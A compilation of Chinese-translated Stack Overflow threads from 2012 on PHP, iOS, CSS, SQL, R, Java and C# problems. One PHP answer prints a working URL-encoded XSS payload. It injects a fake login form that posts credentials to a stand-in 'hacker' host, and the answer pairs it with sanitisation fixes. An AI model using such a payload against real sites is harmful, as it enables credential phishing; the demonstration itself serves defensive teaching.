正如许多其他人所提到的，您可以通过使用`filter_var`或`intval`（如果它是一个数字）来解决这个问题。如果你想更高级，你也可以使用正则表达式来匹配你的字符串。

假设您接受 az AZ 和 0-9。这会起作用：

```
if (preg_match("/^[0-9a-zA-Z]+$", $_GET["id"])) {
    //whatever
} 
```

[`filter_input`](http://www.php.net/manual/en/function.filter-input.php)甚至有一个手动输入完全符合您的要求（将您的输入清理到链接中）：

```
<?php
    $search_html = filter_input(INPUT_GET, 'search', FILTER_SANITIZE_SPECIAL_CHARS);
    $search_url = filter_input(INPUT_GET, 'search', FILTER_SANITIZE_ENCODED);
    echo "You have searched for $search_html.\n";
    echo "<a href='?search=$search_url'>Search again.</a>";
?> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-12T11:51:59.623

是的..一个简单的附加

```
site.php?id=%27%3E%3C%2Fa%3E%3Cbr%3E%3Cbr%3EPlease+login+with+the+form+below+before%0D%0A%09proceeding%3A%3Cform+action%3D%22http%3A%2F%2Fhacker%2Ftest.php%22%3E%3Ctable%3E%0D%0A%09%3Ctr%3E%0D%0A%09%09%3Ctd%3ELogin%3A%3C%2Ftd%3E%0D%0A%09%09%3Ctd%3E%3Cinput+type%3Dtext+length%3D20+name%3Dlogin%3E%3C%2Ftd%3E%0D%0A%09%3C%2Ftr%3E%0D%0A%09%3Ctr%3E%0D%0A%09%09%3Ctd%3EPassword%3A%0D%0A%09%09%3C%2Ftd%3E%0D%0A%09%09%3Ctd%3E%3Cinput+type%3Dtext+length%3D20+name%3Dpassword%3E%3C%2Ftd%3E%0D%0A%09%3C%2Ftr%3E%0D%0A%09%3C%2Ftable%3E%0D%0A%09%3Cinput+type%3Dsubmit+value%3DLOGIN%3E%0D%0A%3C%2Fform%3E%3Ca+href%3D%27
             ^
             |
        Start XSS Injection 
```

这将输出

```
<a href='news.php?id='></a>
<br>
<br>
Please login with the form below before proceeding:
<form action="http://hacker/test.php">
    <table>
        <tr>
            <td>Login:</td>
            <td><input type=text length=20 name=login></td>
        </tr>
        <tr>
            <td>Password:</td>
            <td><input type=text length=20 name=password></td>
        </tr>
    </table>
    <input type=submit value=LOGIN>
</form>
<a href=''>News</a> 
```

向您的客户询问用户名和密码以继续并将信息发送到`http://hacker/test.php`，然后他们会直接恢复正常，就好像什么也没发生一样

要解决此问题，请尝试

```
$_GET["id"] = intval($_GET["id"]); 
```

或者

```
$_GET["id"] = filter_var($_GET["id"], FILTER_SANITIZE_NUMBER_INT); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-12T11:52:06.377

您需要进行 urlencode：

```
$url .= "?id=" . urlencode($_GET["id"]); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-12T11:53:15.400

作为一个全局规则，您必须过滤 GET 和 POST 的内容。在使用 $_GET['id'] 的内容之前使用 filter_var。

```
$filtered_id = filter_var ($_GET['id'], FILTER_SANITIZE_NUMBER_INT);
// or at least
$id = (int) $_GET['id']; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-12T11:53:23.767

切勿直接使用 $_GET 或 $_POST ！！！你必须以某种方式逃避它..例如..

```
$url = "news.php";
if (isset($_GET['id']) && $id=intval($_GET["id"])>0){
  $url .= "?id={$id}";
}
echo "<a href='{$url}'>News</a>"; 
```

# c# - 生成和验证验证码图像 - Windows 8 应用程序

> ID：13343187
> 
> 赞同：1
> 
> 时间：2012-11-12T11:49:39.067
> 
> 标签：c#, windows-8, winrt-xaml

如何在 Windows 8 App (metro) 中的用户注册表单中生成和验证验证码图像？我正在使用 XAML 和 C#。

# ios - 在 ViewController 之间传递 MutableArray

> ID：13343200
> 
> 赞同：0
> 
> 时间：2012-11-12T11:50:20.493
> 
> 标签：ios, objective-c, nsmutablearray

```
 BookingDocumentsViewController *bdVc = [self.storyboard instantiateViewControllerWithIdentifier:@"BookingDocs"];
    bdVc.orId = rl_id;
    bdVc.docsArray =  self.documentsArray;
    [self.navigationController pushViewController:bdVc animated:YES]; 
```

我有上面的代码片段。我正在尝试加载一个新的视图控制器并将其可变数组（docsArray）对象分配给当前视图的可变数组（documentsArray <=this is not nil）

每当我执行上述代码时，我都会收到 EXC_BAD_ACCESS 错误。

但如果我评论第三行。它可以工作，但我无法让我的数组进入新视图。我什至试过`[[NSMutableArray alloc] initWithArray:self.documentsArray];`这个也不起作用。

但是，如果我使用`bdVc.docsArray =[[[NSMutableArray alloc] init];`它可以工作，但我又无法将我的可变数组放到新视图中。

编辑：但是第二行有 NSString 值。他们可以毫无问题地通过。

我在这里做错了什么？

我在控制台中没有收到任何错误，而是得到了这个。

![在此处输入图像描述](../Images/c5d69c0cd97b0a392f52267f2165a151.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T12:15:51.790

也许考虑使用Segue。它为您实例化目标视图控制器。然后在您的源视图控制器中实现

```
- (void) prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender 
```

获取对目标视图控制器的引用并设置其数据。

```
BookingDocumentsViewController *bdVc = [segue destinationViewController];
bdVc.docsArray = self.documentsArray; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T12:02:54.090

在 BookingDocumentsViewController.h

```
@property(nonatomic, retain)NSmutableArray *docsArray; 
```

你可以在你的 BookingDocumentsViewController.m 中做：

```
@synthesize docsArray;

- (void)viewDidLoad
 {
    NSmutableArray *array = [NSmutableArray alloc]initWithArray:docsArray];   
   [super viewDidLoad];
 } 
```

那么当你推送视图时

```
BookingDocumentsViewController *bdVc = [self.storyboard instantiateViewControllerWithIdentifier:@"BookingDocs"];
bdVc.orId = rl_id;
bdVc.docsArray =  self.documentsArray;
[self.navigationController pushViewController:bdVc animated:YES];
[bdVc Release]; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-12T12:27:35.803

我想我找到了问题所在。一个非常基本的错误。在 bdVc 的 viewDidLoad 我有以下行，

`NSLog(@"Booking Documents viewDidLoad : %@",self.docsArray.count);`

这是导致错误的原因。%@ 而不是 %d。我想知道为什么 xcode 没有显示错误的正确原因。

谢谢大家的帮助。:)

# sencha-touch-2 - 在sencha touch 2中动态添加轮播

> ID：13343201
> 
> 赞同：0
> 
> 时间：2012-11-12T11:50:26.863
> 
> 标签：sencha-touch-2

动态添加轮播项目的最佳实践/程序是什么。我需要一个顶部栏和底部栏，它们是固定的，在它们之间，需要一个轮播，其项目将从 url 动态添加。轮播的项目将用作我的应用程序中的图标，单击它们会列出它们各自的子类别。我尝试使用 Ext.getCmp('carousel').add() 方法在初始化事件中添加轮播和顶部栏和底部栏，但是在 android 2 手机中查看轮播项目时不会加载它。

代码如下所示

```
var obj;
var lengthArray,t,str;
var added_carousel ;
var rid=1;
horizontalCarousels = []; 
Ext.define('AppNew.view.HomePage', {
    extend: 'Ext.Carousel',
    layout:{
        type: 'card',
        animation: {
            type: 'slide',
            direction: 'left' 
        }
    },
    xtype: 'homepage',
    id:'carouselpage',
    requires: [ 'AppNew.view.TopBar','Ext.data.Store','Ext.dataview.List',],
    initialize : function() {
    Ext.Ajax.request({
         url: 'http://127.0.0.1/AppNew/AppNewApi/GetCategory?rest_id='+rid,
         success: function(response, opts) {
         var h = Math.ceil(Ext.Viewport.getWindowHeight() * 0.7);
         var padvalue=h*.2;
         var padvalue2=h/8.5;
             var w = Math.ceil(Ext.Viewport.getWindowWidth() * 0.9);

         obj = Ext.decode(response.responseText);
         lengthArray=obj.category.length;
         var division=Math.floor(lengthArray/num1);
         var modulus=lengthArray%num1;
         if(modulus>0) {
             var pages=division+1;
         }else {
              var pages=division;
         }

         Ext.getCmp('carouselpage').add([{
                                        xtype: 'topbar',
                                        docked: 'bottom', 
                                      listeners:{
                                            activeitemchange:function( obj, value, oldValue, eOpts ){
                                                console.log(value); 

                                                var values_button=value.config.title;
                                                if(values_button=='Contact') {
                                                    if(Ext.getCmp('ContactPage')){
                                                    Ext.getCmp('ContactPage').destroy();
                                                    }
                                                     Ext.Viewport.setActiveItem({

                                                       xtype: 'contactpage'  
                                                   });
                                                }
                                            }
                                        },
                                        activeItem: 0,    
                                        scrollable : {
                                          direction     : false,
                                          directionLock : true
                                        },

                                        items: [

                                                {
                                                    title: 'Get Social',
                                                    iconCls: 'social',
                                                    html: 'Get Social screen'
                                                },
                                                {
                                                    title: 'Contact',
                                                    iconCls: 'locate',
                                                    text: "Save",

                                                }
                                            ]

                                        } 

                                        ]);
            start='';
              Ext.getCmp('carouselpage').add([
                                      {
                    xtype: 'toolbar',
                    docked: 'top',
                    title: 'AppNew' ,
                    id:'toptoolbar' }

                ]);

                  for ( i=-1;i<=pages;i++)
              {

                  if(i<0)
                  {
                      start=1; 
                  } 
                  else
                  {
                      start=i*num1;   
                  }

                      t= new Date().getTime();
                 if(i>0 ){

                  Ext.getCmp('carouselpage').add([

                                       {
                                             xtype: 'dataview',
                                            id:'li'+start,
                                            scroll: false,
                                            scrollable : {
                                              direction     : false,
                                                directionLock : true
                                            },

                                            items:[ 

                                            ],
                                            listeners: {
                                                activate:function(){console.log('in');

                                            console.log(start);
                                            }

                                            },
                                            store:str,

                                            itemTpl: '<div style="margin-top:'+padvalue+'px;  float:left;text-align:center;display:block;width:49%;height:'+padvalue2+'px"><img src="{image}" /><!--<h2>{client_category_id}</h2>--!><p>{category_name}</p></div>' 

                                        }
                                   ]);
                 }

              }

           },
           failure: function(response, opts) {
              console.log('server-side failure with status code ' + response.status);
           }
        });

    }  ,
    config: {

    listeners:{
    add:function(HomePage, item, index, eOpts       ){

        if(added_carousel)
        {
            if(added_carousel!=1){
            gr=3; 
            }
            else
            {
                gr=3;
                added_carousel=1;

            }
        }
        else
        {
            gr=2;
            added_carousel=1;
        }
        if(parseInt(index) >1){
            str=Ext.create("AppNew.store.HomePage");

            str.getProxy().setExtraParam('rest_id',rest_id);
            str.getProxy().setExtraParam('start1',start);
            str.getProxy().setExtraParam('end',num1);
            str.getProxy().setExtraParam('t',t);
            str.load();
        }   else{
            str=''; 

        }

    }
},
        title: 'AppNew',
        fullscreen: true,

        items: [  ]
    }  ,

}) 
```

# google-apps-script - 应用程序未显示在图库中

> ID：13343204
> 
> 赞同：0
> 
> 时间：2012-11-12T11:50:46.130
> 
> 标签：google-apps-script

我找不到任何联系信息，所以我认为在这里发帖是下一个最好的选择。我上周重新提交了一个应用程序（实际上我现在已经完成了两次，以防出现一些错误）并且我遇到了一些问题：

1) 以前版本的应用程序已从图库中消失；2）它需要大量的时间（相对于我的其他经历）才能获得批准。

我可以联系谁来跟进此事，因为这对我们的需求非常紧迫。

非常感谢，

埃蒙

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T19:29:50.363

发布到画廊的脚本的审核过程有时会出现延迟。如果需要很长时间（几周），您可能需要考虑重新提交脚本。

# javascript - 如何使用 Javascript 为移动设备开发动态嵌套列表？

> ID：13343205
> 
> 赞同：0
> 
> 时间：2012-11-12T11:50:47.190
> 
> 标签：javascript, html, jsp, dom-events

我正在使用 jQuery mobile 和 spring MVC 开发一个移动应用程序。在应用程序中，我使用嵌套列表，但这些嵌套列表在 Symbian (Nokia-E71,...) 移动设备中不起作用，因为这些移动设备不支持 jQuery。

**如何在不使用 jQuery 的情况下开发嵌套列表？**我尝试使用 html 标签，但总嵌套列表显示在主页中。我想要如下的嵌套列表.....

1.  每当单击菜单时，主菜单将消失，而特定菜单的子菜单将显示。

2.  如果菜单没有子菜单，它会显示一个表格。

3.  它将支持多达 5 级菜单和子菜单。

我尝试了以下方法：

```
<script type="text/javascript">
function init() {
    var myStyleTweaks = new StyleTweaker();
    myStyleTweaks.add("AppleWebKit/420+", "resources/static/tweaks/S40webkit.css");
    myStyleTweaks.add("Maemo", "resources/static/tweaks/maemo.css");
    myStyleTweaks.tweak(); hideDiv(); toggle_secondlevel();
}
addEvent("onload",init); 
```

我尝试使用多个 div，但我的菜单包含相互显示的关系，请给我任何想法...

请帮忙。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-14T09:00:00.957

这是一个开始：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
      <title>Menu Test</title>
      <script type="text/javascript">
         function toggle(element)
         {
            if (element.style.display != "none") {
               element.style.display = "none"
            } else {
               element.style.display = "block"
            }
         }
      </script>
   </head>
   <body>
      <ul>
         <li>
            <a href="#" onclick="toggle(document.getElementById('menu1')); return false">Menu 1</a>
            <ul id="menu1" style="display: none">
               <li><a href="#">Item 1</a></li>
               <li><a href="#">Item 2</a></li>
            </ul>
         </li>
         <li>
            <a href="#" onclick="toggle(document.getElementById('menu2')); return false">Menu 2</a>
            <ul id="menu2" style="display: none">
               <li><a href="#">Item 1</a></li>
               <li><a href="#">Item 2</a></li>
            </ul>
         </li>
      </ul>
   </body>
</html> 
```

# visual-studio - 在编译时确定 VC++ 是否为 express 版本

> ID：13343206
> 
> 赞同：1
> 
> 时间：2012-11-12T11:51:02.230
> 
> 标签：visual-studio, visual-studio-express, visual-studio-macros

我开发了一个开源库。它具有 MFC 的可选功能。现在，通过检查是否定义了宏 _MSC_VER，将为其他编译器编译出 MFC 内容。但是 VC++ Express 的用户抱怨这会产生编译错误，因为它没有 MFC。有没有办法在编译时确定这一点？

我尝试了 _MFC_VER，但这是在 afxver_.h 中定义的，并且该头文件不在 express 版本中。

我更喜欢一个适用于 2005 年到 2012 年每个 VC++ 版本的解决方案，但只适用于 2010 年和 2012 年的解决方案就可以了。

# javascript - 在 ckeditor 中切换实时预览

> ID：13343219
> 
> 赞同：0
> 
> 时间：2012-11-12T11:51:39.820
> 
> 标签：javascript, jquery, ckeditor

我正在为 ckeditor 使用 jquery 适配器，我可以在编辑器预览中添加自定义 css 文件，使用`CKEDITOR.config.contentsCss` 下面是嵌入的 javascript 代码来为带有#editor2 ID 的 textarea 创建 ckeditor。

```
jQuery(function()
{
  var config = {
  contentsCss :['css/bootsrap/bootstrap.css', 'contents-custom.css'],
}
jQuery('#editor2').ckeditor(config); 
```

我想创建一个插件，单击此按钮时可能称为“实时预览”，这些 CSS 文件将被添加。这个按钮应该像切换。

我的问题是，如何控制配置添加和删除 contentCss 配置？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T15:17:59.490

使用 jQuery，您将能够欺骗页面。我认为使用 CKEditor 的 API 没有已知的方法可以做到这一点。但是，您可以删除`<link>`您的文件。

```
//to remove styling:
$('#cke_ckeditor iframe').contents().find('html head link').remove();
//to reload CSS:
$('#cke_ckeditor iframe').contents().find('html head').append('<link href="customContents.css" rel="stylesheet" type="text/css" />'); 
```

如果需要，您可以通过仅删除`first()`或`last()`链接以及重新加载代码段来控制将删除哪个文件。

祝你好运！

# html - 将鼠标悬停在另一个 div 上时更改另一个 div 背景

> ID：13343220
> 
> 赞同：2
> 
> 时间：2012-11-12T11:51:48.993
> 
> 标签：html, css

将鼠标悬停在另一个 div 上时尝试更改 div 背景颜色。但我无法让它发挥作用。现在一直在找她，但找不到类似的问题。

```
<style type="text/css">
    #main {
        width: 960px;
        height: 600px;
        margin: auto;
        position: relative;
        background: red;
    }

    #trykk {
        width: 100px;
        height: 100px;
        background-color: yellow;
    }

    #trykk:hover #main {
        background-color: green;
    }
</style>

<div id="main">
    <div id="trykk">
    </div>
</div> 
```

这就是我一直在使用的代码。唯一的问题是我不允许使用 javascript。那么当我将鼠标悬停在 div #trykk 上时，有什么方法可以更改 div #main 上的背景颜色吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-12T12:06:50.347

与答案相关的演示`Rodik's`，正如他所说，您不能使用子元素更改选择父元素，因此您无法更改父元素的样式，但是如果您愿意，可以更改标记，如您所说，您不能使用 javascript，但如果可以更改标记比它会像这样

[**演示1**](http://jsfiddle.net/sBk3M/)

HTML

```
<div id="main">Main</div>
<div id="trykk">Trykk</div> 
```

CSS

```
#main:hover + #trykk {
    background-color: green;
} 
```

或者，如果您想像现在一样嵌套您的 div，只需像这样更改选择器

[**演示2**](http://jsfiddle.net/sBk3M/1/)

HTML

```
<div id="main">Main
<div id="trykk">Trykk</div>
</div> 
```

CSS

```
#main:hover > #trykk {
    background-color: green;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T12:01:44.933

CSS 选择只能以一种方式工作，从父级到子级。

因此，孩子的状态不能影响其父母的状态。

实现此类功能需要一个[javascript mouseover事件。](https://developer.mozilla.org/en-US/docs/Mozilla_event_reference/mouseover)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-12T12:01:56.313

使用 jquery 你可以这样做：

```
$(function(){
    $("#trykk").hover(function(){
        $("#main").toggleClass("greenBackground");
    });
}); 
```

# sql - 在 sql 中搜索前 300 行

> ID：13343224
> 
> 赞同：0
> 
> 时间：2012-11-12T11:52:02.897
> 
> 标签：sql, sql-server, search

我正在使用 MS SQL Server Management Studio R2

假设我有一个具有无限记录数的表 tableX，并且该表有一个 colX 列，并且整个表中只有 2 条记录的 colX 不为空，

查询应该是什么样的？

我用了

```
select top 10 * from tableX where colX isnot null 
```

但它永远执行查询

有办法只搜索前 300 行吗？谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T11:56:32.570

> 有没有办法只搜索前 300 行？

就在这里：

```
select top 300 * from tableX where colX isnot null order by id asc 
```

这假设您在 tableX 上有一个名为 id 的列，它是一个标识列。基本上，我们可能需要更多信息。:-)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-19T10:36:26.353

好吧，感谢您的帮助，我以一种棘手的方式解决了这个问题，

我确实做了一张新桌子

```
Declare tempTable table(...columns...) 
```

进而

```
insert into tempTable (select top 300* from tableX) 
```

之后，

```
select * from tempTable where colX is not null 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-12-08T12:03:07.147

这些都不适合我。我用了

```
query.setMaxResults(300) 
```

它与 SQL 中的 LIMIT 相同，但在 Java 代码中对我有用。

# r - R中的read.table没有读取所有列

> ID：13343226
> 
> 赞同：1
> 
> 时间：2012-11-12T11:52:15.407
> 
> 标签：r

我之前发布了一个与此相关的问题，但解决方案并没有完全解决我的问题。

我有一个包含字符“'”和“#”的表，当我使用 read.table() 读取它时，它不能跳过包含这些字符的行。

我正在使用以下命令读取文件：

```
table<- read.table("table.txt",header =TRUE, sep ="\t",quote="'",skip=8,fill=TRUE, comment.char="#",check.names=F) 
```

这只是读取表格的第一列，而不是像应该做的那样读取整个表格，有什么建议可以解决这个问题吗？ ![在此处输入图像描述](../Images/662aeea9199cb9f28e53e124b39e3982.png)

包含 # 的表的示例行是：

```
Homo sapiens    Unigene Hs.549823   ILMN_110080 HS.549823   Hs.549823       Hs.549823       5053715 AI732602            ILMN_1846799    5910129 S   320 GCAGGTTGTTATTGTTGCTGAGCGGGGTGTGTGGGTGGCTAACGAGAGGG  11  +   61276241-61276290       zo26g12.x5 Stratagene colon (#937204) Homo sapiens cDNA clone IMAGE:588070 3, mRNA sequence 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T05:21:36.673

尝试使用`readLines()`来获取原始行，然后根据您的分隔符拼接它们

```
library(stringr)

# Open Connection to file
pathToFile <- path.expand("~/path/to/file/myfile.txt")
f <- file(pathToFile, "rb")  

# Read in lines
rawText <- readLines(f)

problemFreeTable <- 
  sapply(rawText, str_split, "\t")  # replace "\t" with "," or the appropriate delim. 
```

# java - 使用字符串生成器或存储过程进行单行选择

> ID：13343231
> 
> 赞同：1
> 
> 时间：2012-11-12T11:52:30.897
> 
> 标签：java, sql, jdbc, plsql

我的应用程序中有很多单行选择查询，多个连接跨越 5-6 个表。这些查询是基于许多条件生成的，这些条件基于来自表单等的输入，使用字符串生成器。然而，我的团队负责人恰好是一名 sql 开发人员，他要求我将这些单行查询转换为存储过程。

将单行选择查询转换为后端并作为 SP 执行所有 if 和 else 是否有任何优势。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T12:26:57.293

将所有 sql 部分都包含在存储过程中的一个优点是，您可以将查询保存在一个地方，即数据库中，这样可以更容易地更改或修改，而无需在应用程序层或前端层进行大量更改。

此外，如果 SQL 存储在数据库过程中，DBA 或 SQL 开发人员可以对 SQL 进行微调。您可以将所有函数/存储过程保存在一个包中，这在性能和组织对象方面会更好（类似于在 Java 中创建包的方式）。当然，在包中，您可以限制对其对象的直接访问。

这更多的是团队或部门的政策，无论是在前端还是在数据库本身中，将 sql 部分保留在哪里，当然就像@Gimby 提到的那样，很多人可能有不同的看法。

*更新 1*

如果您有一个返回某些内容的 select 语句，请使用函数，如果您有 INSERT/UPDATE/DELETE 或类似的东西，例如发送电子邮件或其他业务规则，则使用一个过程并通过传递参数从前端调用这些。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T12:44:52.537

如果您在 java 中使用 PreparedStatement，那么 java 查询和存储过程之间的性能没有太大差异。（如果你在java中使用Statement，那么你有问题）。

但是存储过程是组织和重用你的 sql 代码的好方法。您可以将它们分组到包中，您可以在不进行 java 编译的情况下更改它们，并且您的 DBA 或 SQL 专家可以调整它们。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-12T12:21:38.553

恐怕这个问题会根据许多不同的个人观点导致许多不同的答案。

无论如何，您在这里谈论的它的业务逻辑在我看来属于应用程序层。但我认识一大群完全不同意我的 Oracle 开发人员。

# javascript - onkeypress 事件在 Firefox 中不起作用？如何解决？

> ID：13343232
> 
> 赞同：3
> 
> 时间：2012-11-12T11:52:33.687
> 
> 标签：javascript

> **可能重复：**
> [onKeyPress 事件在 Firefox 中不起作用](https://stackoverflow.com/questions/4496910/onkeypress-event-not-working-in-firefox)

```
<div><textarea maxlength="1000" rows ="5" cols ="5" 
   style="width:398px; height: 175px; overflow: auto; padding: 4px !important" 
   name="body" value="" id="body" onkeypress="imposeMaxLength(this, 10);"  
   onPaste="imposeMaxLength(this, 10);" /></textarea></div>
<script>
function imposeMaxLength(field, MaxLen){

    if (field.value.length > (MaxLen-1)) {
        alert("It cannot exceed " + MaxLen + " characters.");
        field.value= field.value.substr(0, (MaxLen);
    }
}
</script> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T11:55:18.600

Your markup isn't right

```
<textarea ... /></textarea> 
```

is invalid, it should be

```
 <textarea ... ></textarea> 
```

And try this, it's working

```
<div>
  <textarea maxlength="1000" 
            rows="5"
            cols="5" 
            style="width: 398px; height: 175px;overflow: auto; padding: 4px !important"              
name="body" 
            id="body" 
            onkeypress="imposeMaxLength(this, 10);"
            onpaste="imposeMaxLength(this, 10);" >
    </textarea>
</div>

<script type="text/javascript">
function imposeMaxLength(field, MaxLen){
    if (field.value.length > (MaxLen-1)) {
        alert("It cannot exceed " + MaxLen + " characters.");
        field.value = field.value.substr(0, (MaxLen));
   }
}
</script> 
```

# java - 如何从字节 [] 创建 java.io.File

> ID：13343234
> 
> 赞同：-4
> 
> 时间：2012-11-12T11:52:42.237
> 
> 标签：java, file, byte

> **可能重复：**
> [从字节数组创建文件](https://stackoverflow.com/questions/3704554/creating-a-file-from-byte-array)

大家好我有一个问题我有一个字节数组，里面有一个文件.doc 我需要将此字节数组转换为 java.io.File 谁可以发布一段执行我请求的 Java 代码？谢谢大家

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T11:55:12.967

Use file output stream:

```
FileOutputStream fos = new FileOutputStream("filename");
fos.write(byteArray);
fos.close(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T11:55:27.833

Create a ByteOutputStream with your binary representation, and then:

```
OutputStream outputStream = new FileOutputStream ("c:\\a.doc"); 
byteArrayOutputStream.writeTo(outputStream);
byteArrayOutputStream.close(); 
```

I think it will be enough

Hope this helps

# string - 将不同的字符串散列到相同的结果

> ID：13343235
> 
> 赞同：0
> 
> 时间：2012-11-12T11:52:59.213
> 
> 标签：string, hash

我正在为用 C# 编写的结账设置一个优惠券代码系统，我希望能够分发做同样事情的独特优惠券，有点像产品密钥。

有没有办法生成唯一的（相当短，最好是字母数字）字符串，这些字符串将以某种方式“散列”以给出相同的结果？

换句话说，我可以从定义的凭证代码开始并获得多个反向哈希结果吗？

如果我没有很好地解释这一点，我很抱歉 - 如果需要，我可以提供更多信息。

**编辑：**我知道我可以使用带有预定义代码的查找表，但我想知道是否有一种方法可以自动生成这些代码以允许系统轻松扩展。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-15T11:04:22.683

这里有一个想法...

使用一些秘密密码开始：“100:mypass:yourpass”

然后md5：你会得到

```
md5("10:mypass:yourpass")=f6ff5421b31e609c7dcd19c4a462caa0

'key 1'=>  left 16 chars of md5 = 'f6ff5421b31e60'

  run the right 16 chars of the md5 it into another md5:

md5('7dcd19c4a462caa0') = 582fbfb7a035d08094cdef57d88f720e

'key 2' => '582fbfb7a035d080'

[repeat again here, and again... and again, ] 
```

...

不确定“分发”点，例如它是否将在 POS 类型的礼品卡或代金券系统上运行或什么，但如果您注意到我在“密码”中输入了 3 个组件，则此值*可能*包含总数合法密钥（拆分为“：”，导致 100 个有效密钥中断）、系统（分销商）密码和“验证”或“匹配”“好”密钥所需的本地系统密码。您可以快速扫描以查看密钥是否存在并在本地编写无效例程。我知道，我的数学天才朋友可能会说有一种更好、更安全、更有效的方法，但是嘿……这就是你要求的对吧？我是一个简单的人，喜欢简单的事情...`pass=> "100:1000:pass1:pass2"`这样你就可以测试第 100->1000 个 md5 的部分键......干杯！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T12:06:20.340

您正在寻找的是所谓的[完美哈希函数](http://en.wikipedia.org/wiki/Perfect_hash_function)。

[在这里](http://homepages.dcc.ufmg.br/~nivio/papers/cikm07.pdf)你可以找到一篇关于如何有效地为大密钥集生成完美哈希的文章。

[在这里](http://www.dupuis.me/node/9)你可以找到 ac# 最小完美哈希函数生成器。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-12T12:11:01.473

您可以使用通过当前日期/时间生成的哈希

```
<!-- language: c# -->
byte[] ByteArray = Encoding.UTF8.GetBytes(System.DateTime.Now.ToString());
MD5 md5 = MD5.Create();
byte[] ByteResult = md5.ComputeHash(ByteArray);
StringBuilder result = new StringBuilder(ByteResult.Length * 2);
for (int i = 0; i < ByteResult.Length; i++)
    result.Append(ByteResult[i].ToString("X2"));
Console.WriteLine(result.ToString()); 
```

# c# - 连接未关闭 连接的当前状态为打开

> ID：13343236
> 
> 赞同：7
> 
> 时间：2012-11-12T11:53:10.740
> 
> 标签：c#

如何解决这个问题；连接已经在我的函数中关闭：

```
SqlConnection con=new SqlConnection(@"Here is My Connection");

public void run_runcommand(string query)   
{   

    try   
    {   
        con.Open();   
        SqlCommand cmd1 = new SqlCommand(query, con);   

        cmd1.ExecuteNonQuery();    
        con.Close();    
    }    
    catch (Exception ex) { throw ex; }                        
}    
//...
try       
{           
    string query="my query";           
    db.run_runcommand(query);          
}         
catch(Exception ex)            
{         
    MessageBox.Show(ex.Message);              
} 
```

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2012-11-12T11:56:58.207

我假设在这一行引发了错误：

```
con.Open(); // InvalidOperationException if it's already open 
```

因为您正在重用连接，并且您上次可能没有关闭它。

完成连接后，您应该立即关闭连接，最好使用`using-statement`：

```
public void run_runcommand(string query)   
{
    using(var con = new SqlConnection(connectionString))
    using(var cmd = new SqlCommand(query, con))
    {
        con.Open();
        // ...
    }  // close not needed since dispose also closes the connection
} 
```

请注意，您不应`Catch`仅使用块来重新引发异常。如果您不对其进行任何处理，则根本不会抓住它。`throw;`使用而不是`throw ex;`保留堆栈跟踪会更好。[https://stackoverflow.com/a/4761295/284240](https://stackoverflow.com/a/4761295/284240)

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-11-12T12:01:04.560

最好写 finally 块，并在`con.close()`其中使用 try catch 块的每个地方。例如。

```
public void run_runcommand(string query)   
{   
    try   
    {   
        con.Open();   
        SqlCommand cmd1 = new SqlCommand(query, con);   

        cmd1.ExecuteNonQuery();    
        con.Close();    
    }    
    catch (Exception ex)
    {
       throw ex; //TODO: Please log it or remove the catch
    }
    finally
    {
       con.close();
    }

}

try       
{           
    string query="my query";           
    db.run_runcommand(query);          
}         
catch(Exception ex)            
{         
    MessageBox.Show(ex.Message);              
}   
finally
{
   con.close();
} 
```

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2012-11-12T11:55:45.550

打开前检查连接状态：

```
if (con.State != ConnectionState.Open)
    con.Open(); 
```

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2017-01-27T16:19:55.827

比这里的答案多一点，我检查它是否不仅打开，而且正在连接，并等待它是否处于连接状态。

```
if (con.State != ConnectionState.Open && con.State != ConnectionState.Connecting) {
    con.Open();
}
var attempts = 0;
while (con.State == ConnectionState.Connecting && attempts < 10) {
    attempts++;
    Thread.Sleep(500);
} 
```

当然，如果您想确保您的连接确实关闭，您还需要`con.Close()`在`finally`after中添加，因为异常之后的任何代码都不会运行。`try``finally`

你也不需要`throw ex`在你的投掷中，你可以`throw;`通过投掷 ex 来破坏堆栈跟踪。

* * *

更新：查看此内容，我发现您`con.Close()`在 try 和 finally 中都有 - 这将始终出错，因为如果 try 块正常工作，它将关闭连接，然后移动到运行错误的 finally 块，并尝试关闭已经关闭的连接。还要小心你的情况 - Close() 和 close() 不是一回事，只有一个实际调用该函数，另一个会出错，因为它未定义。

您需要从 try 块中删除 close 并仅将其保留在 finally 中。

* * *

## 回答 #5

> 赞同：2
> 
